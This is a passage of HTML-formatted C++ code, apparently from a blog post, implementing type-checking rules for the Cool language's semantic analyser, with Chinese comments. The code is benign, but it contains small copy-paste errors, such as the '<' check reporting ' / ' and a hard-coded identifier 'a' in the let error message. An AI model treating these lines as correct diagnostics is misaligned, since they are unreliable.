&lt;&lt; <span class="string">&quot;Expression type &quot;</span></span><br><span class="line">        &lt;&lt; expr-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; does not conform to declared static dispatch type &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_type_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法不存在，则后面无需在进行检查</span></span><br><span class="line">        <span class="built_in">set_type</span>(Object);</span><br><span class="line">        <span class="keyword">return</span> Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//首先检验相关的函数有定义</span></span><br><span class="line">    method_class *method = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span>((method = class_table-&gt;<span class="built_in">lookup_method</span>(<span class="built_in">get_type_name</span>(), <span class="built_in">get_name</span>())) == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Dispatch to undefined method &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法不存在，则后面无需在进行检查</span></span><br><span class="line">        <span class="built_in">set_type</span>(Object);</span><br><span class="line">        <span class="keyword">return</span> Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检验参数符号列表个数是否一致</span></span><br><span class="line">    Formals formals = method-&gt;<span class="built_in">get_formals</span>();</span><br><span class="line">    Expressions expressions = <span class="built_in">get_actual</span>();</span><br><span class="line">    <span class="keyword">if</span>(formals-&gt;<span class="built_in">len</span>() != expressions-&gt;<span class="built_in">len</span>()) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Method &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot; called with wrong number of arguments.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//参数不一致，则后面无需在进行检查</span></span><br><span class="line">        <span class="built_in">set_type</span>(method-&gt;<span class="built_in">get_return_type</span>());</span><br><span class="line">        <span class="keyword">return</span> method-&gt;<span class="built_in">get_return_type</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检验参数列表是否一致</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = formals-&gt;<span class="built_in">first</span>(); formals-&gt;<span class="built_in">more</span>(i); i = formals-&gt;<span class="built_in">next</span>(i)) &#123;</span><br><span class="line">        Symbol temp = expressions-&gt;<span class="built_in">nth</span>(i)-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">        Formal formal = formals-&gt;<span class="built_in">nth</span>(i);</span><br><span class="line">        <span class="keyword">if</span>(!class_table-&gt;<span class="built_in">isInherits</span>(temp, formal-&gt;<span class="built_in">get_type</span>())) &#123;</span><br><span class="line">            class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;In call of method &quot;</span></span><br><span class="line">            &lt;&lt; <span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;, type &quot;</span> &lt;&lt; temp-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of parameter &quot;</span></span><br><span class="line">            &lt;&lt; formal-&gt;<span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; does not conform to declared type &quot;</span></span><br><span class="line">            &lt;&lt; formal-&gt;<span class="built_in">get_type</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//参数不一致，则后面无需在进行检查</span></span><br><span class="line">            <span class="built_in">set_type</span>(method-&gt;<span class="built_in">get_return_type</span>());</span><br><span class="line">            <span class="keyword">return</span> method-&gt;<span class="built_in">get_return_type</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Symbol return_type = method-&gt;<span class="built_in">get_return_type</span>();</span><br><span class="line">    <span class="keyword">if</span>(return_type == SELF_TYPE) &#123; return_type = <span class="built_in">get_type_name</span>(); &#125;</span><br><span class="line">    <span class="built_in">set_type</span>(return_type);</span><br><span class="line">    <span class="keyword">return</span> return_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">dispatch_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要做如下规则检查</span></span><br><span class="line"><span class="comment">     * 1. 相关的函数有定义</span></span><br><span class="line"><span class="comment">     * 2. 参数列表个数</span></span><br><span class="line"><span class="comment">     * 3. 参数列表内容</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//首先检验相关的函数有定义</span></span><br><span class="line">    Symbol expr =  <span class="built_in">get_expr</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    method_class *method = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">if</span>((method = class_table-&gt;<span class="built_in">lookup_method</span>(class_table-&gt;<span class="built_in">lookup_class</span>(expr), <span class="built_in">get_name</span>())) == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Dispatch to undefined method &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//方法不存在，则后面无需在进行检查</span></span><br><span class="line">        <span class="built_in">set_type</span>(Object);</span><br><span class="line">        <span class="keyword">return</span> Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检验参数符号列表个数是否一致</span></span><br><span class="line">    Formals formals = method-&gt;<span class="built_in">get_formals</span>();</span><br><span class="line">    Expressions expressions = <span class="built_in">get_actual</span>();</span><br><span class="line">    <span class="keyword">if</span>(formals-&gt;<span class="built_in">len</span>() != expressions-&gt;<span class="built_in">len</span>()) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Method &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_name</span>() &lt;&lt; <span class="string">&quot; called with wrong number of arguments.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//参数不一致，则后面无需在进行检查</span></span><br><span class="line">        <span class="built_in">set_type</span>(method-&gt;<span class="built_in">get_return_type</span>());</span><br><span class="line">        <span class="keyword">return</span> method-&gt;<span class="built_in">get_return_type</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检验参数列表是否一致</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = formals-&gt;<span class="built_in">first</span>(); formals-&gt;<span class="built_in">more</span>(i); i = formals-&gt;<span class="built_in">next</span>(i)) &#123;</span><br><span class="line">        Symbol temp = expressions-&gt;<span class="built_in">nth</span>(i)-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">        Formal formal = formals-&gt;<span class="built_in">nth</span>(i);</span><br><span class="line">        <span class="keyword">if</span>(!class_table-&gt;<span class="built_in">isInherits</span>(temp, formal-&gt;<span class="built_in">get_type</span>())) &#123;</span><br><span class="line">            class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;In call of method &quot;</span></span><br><span class="line">            &lt;&lt; <span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;, type &quot;</span> &lt;&lt; temp-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of parameter &quot;</span></span><br><span class="line">            &lt;&lt; formal-&gt;<span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; does not conform to declared type &quot;</span></span><br><span class="line">            &lt;&lt; formal-&gt;<span class="built_in">get_type</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//参数不一致，则后面无需在进行检查</span></span><br><span class="line">            <span class="built_in">set_type</span>(method-&gt;<span class="built_in">get_return_type</span>());</span><br><span class="line">            <span class="keyword">return</span> method-&gt;<span class="built_in">get_return_type</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Symbol return_type = method-&gt;<span class="built_in">get_return_type</span>();</span><br><span class="line">    <span class="keyword">if</span>(return_type == SELF_TYPE) &#123; return_type = expr; &#125;</span><br><span class="line">    <span class="built_in">set_type</span>(return_type);</span><br><span class="line">    <span class="keyword">return</span> return_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">cond_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 判断条件是Bool类型的</span></span><br><span class="line"><span class="comment">     * 2. 检查执行表达式是否正确</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(!class_table-&gt;<span class="built_in">isInherits</span>(<span class="built_in">get_pred</span>()-&gt;<span class="built_in">check_type</span>(class_table), Bool)) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Predicate of &#x27;if&#x27; does not have type Bool.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历执行表达式，找到公共的最小祖先</span></span><br><span class="line">    Symbol return_type = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_enter_scope</span>();</span><br><span class="line">    return_type = class_table-&gt;<span class="built_in">findLowestCommonAncestor</span>(return_type, <span class="built_in">get_then_exp</span>()-&gt;<span class="built_in">check_type</span>(class_table));</span><br><span class="line">    class_table-&gt;<span class="built_in">object_exit_scope</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_enter_scope</span>();</span><br><span class="line">    return_type = class_table-&gt;<span class="built_in">findLowestCommonAncestor</span>(return_type, <span class="built_in">get_else_exp</span>()-&gt;<span class="built_in">check_type</span>(class_table));</span><br><span class="line">    class_table-&gt;<span class="built_in">object_exit_scope</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(return_type);</span><br><span class="line">    <span class="keyword">return</span> return_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">loop_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 判断类型必须是Bool类型</span></span><br><span class="line"><span class="comment">     * 2. 检查body即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//检查判断类型</span></span><br><span class="line">    <span class="keyword">if</span>(!class_table-&gt;<span class="built_in">isInherits</span>(<span class="built_in">get_pred</span>()-&gt;<span class="built_in">check_type</span>(class_table), Bool)) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Loop condition does not have type Bool.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查body</span></span><br><span class="line">    class_table-&gt;<span class="built_in">object_enter_scope</span>();</span><br><span class="line">    <span class="built_in">get_body</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    class_table-&gt;<span class="built_in">object_exit_scope</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Object);</span><br><span class="line">    <span class="keyword">return</span> Object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">typcase_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 检查表达式合法性</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">get_expr</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//然后依次遍历Case，找出公共的最小祖先并返回即可</span></span><br><span class="line">    Cases cases = <span class="built_in">get_cases</span>();</span><br><span class="line">    Symbol return_type = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = cases-&gt;<span class="built_in">first</span>(); cases-&gt;<span class="built_in">more</span>(i); i = cases-&gt;<span class="built_in">next</span>(i)) &#123;</span><br><span class="line"></span><br><span class="line">        class_table-&gt;<span class="built_in">object_enter_scope</span>();</span><br><span class="line">        Symbol temp = cases-&gt;<span class="built_in">nth</span>(i)-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">        return_type = class_table-&gt;<span class="built_in">findLowestCommonAncestor</span>(return_type, temp); </span><br><span class="line">        class_table-&gt;<span class="built_in">object_exit_scope</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(return_type);</span><br><span class="line">    <span class="keyword">return</span> return_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">block_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 简单的遍历其中表达式，并且返回最后一个表达式类型即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Expressions expressions= <span class="built_in">get_body</span>();</span><br><span class="line">    Symbol symbol;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = expressions-&gt;<span class="built_in">first</span>(); expressions-&gt;<span class="built_in">more</span>(i); i = expressions-&gt;<span class="built_in">next</span>(i)) &#123;</span><br><span class="line">        symbol = expressions-&gt;<span class="built_in">nth</span>(i)-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(symbol);</span><br><span class="line">    <span class="keyword">return</span> symbol;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">let_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 变量类型合法</span></span><br><span class="line"><span class="comment">     * 2. 如果存在初始化，检查初始化符合变量类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol type = <span class="built_in">get_type_decl</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查变量类型合法</span></span><br><span class="line">    <span class="keyword">if</span>(class_table-&gt;<span class="built_in">lookup_class</span>(type) == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Class &quot;</span></span><br><span class="line">        &lt;&lt; type-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of let-bound identifier &quot;</span></span><br><span class="line">        &lt;&lt; <span class="built_in">get_identifier</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; is undefined.&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//最简单的处理方法</span></span><br><span class="line">        type = Object;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查初始化符合变量类型</span></span><br><span class="line">    Symbol init_type = <span class="built_in">get_init</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line">    <span class="keyword">if</span>(init_type != No_class &amp;&amp; !class_table-&gt;<span class="built_in">isInherits</span>(init_type, type)) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Inferred type &quot;</span></span><br><span class="line">        &lt;&lt; init_type-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; of initialization of a does not conform to identifier&#x27;s declared type &quot;</span></span><br><span class="line">        &lt;&lt; type-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_enter_scope</span>();</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_add</span>(<span class="built_in">get_identifier</span>(), class_table-&gt;<span class="built_in">lookup_class</span>(type));</span><br><span class="line">    Symbol return_type = <span class="built_in">get_body</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    class_table-&gt;<span class="built_in">object_exit_scope</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(return_type);</span><br><span class="line">    <span class="keyword">return</span> return_type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">plus_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 两个变量类型必须是Int类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table), e2 = <span class="built_in">get_e2</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Int || e2 != Int) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;non-Int arguments: &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; + &quot;</span> &lt;&lt; e2-&gt;<span class="built_in">get_string</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Int);</span><br><span class="line">    <span class="keyword">return</span> Int;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">sub_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 两个变量类型必须是Int类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table), e2 = <span class="built_in">get_e2</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Int || e2 != Int) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;non-Int arguments: &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; - &quot;</span> &lt;&lt; e2-&gt;<span class="built_in">get_string</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Int);</span><br><span class="line">    <span class="keyword">return</span> Int;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">mul_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 两个变量类型必须是Int类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table), e2 = <span class="built_in">get_e2</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Int || e2 != Int) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;non-Int arguments: &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; * &quot;</span> &lt;&lt; e2-&gt;<span class="built_in">get_string</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Int);</span><br><span class="line">    <span class="keyword">return</span> Int;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">divide_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 两个变量类型必须是Int类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table), e2 = <span class="built_in">get_e2</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Int || e2 != Int) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;non-Int arguments: &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; / &quot;</span> &lt;&lt; e2-&gt;<span class="built_in">get_string</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Int);</span><br><span class="line">    <span class="keyword">return</span> Int;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">neg_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 变量类型必须是Int类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Int) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Argument of &#x27;~&#x27; has type &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; instead of Int.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Int);</span><br><span class="line">    <span class="keyword">return</span> Int;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">lt_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 两个变量类型必须是Int类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table), e2 = <span class="built_in">get_e2</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Int || e2 != Int) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;non-Int arguments: &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; / &quot;</span> &lt;&lt; e2-&gt;<span class="built_in">get_string</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Bool);</span><br><span class="line">    <span class="keyword">return</span> Bool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">eq_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 两个变量如果是Int、Str或Bool，类型必须一样</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table), e2 = <span class="built_in">get_e2</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((e1 == Int || e1 == Bool || e1 == Str || e2 == Int || e2 == Bool || e2 == Str) &amp;&amp; e1 != e2) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Illegal comparison with a basic type.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Bool);</span><br><span class="line">    <span class="keyword">return</span> Bool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">leq_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 两个变量类型必须是Int类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table), e2 = <span class="built_in">get_e2</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Int || e2 != Int) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;non-Int arguments: &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; &lt;= &quot;</span> &lt;&lt; e2-&gt;<span class="built_in">get_string</span>() &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Bool);</span><br><span class="line">    <span class="keyword">return</span> Bool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span class="title">comp_class::check_type</span><span class="params">(ClassTable *class_table)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 需要进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 变量类型必须是Bool类型</span></span><br><span class="line"><span class="comment">     * 2. 其返回值是Bool</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol e1 = <span class="built_in">get_e1</span>()-&gt;<span class="built_in">check_type</span>(class_table);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(e1 != Bool) &#123;</span><br><span class="line">        class_table-&gt;<span class="built_in">semant_error</span>(<span class="keyword">this</span>) &lt;&lt; <span class="string">&quot;Argument of &#x27;not&#x27; has type &quot;</span></span><br><span class="line">        &lt;&lt; e1-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; instead of Bool.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set_type</span>(Bool);</span><br><span class="line">    <span class="keyword">return</span> Bool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Symbol <span 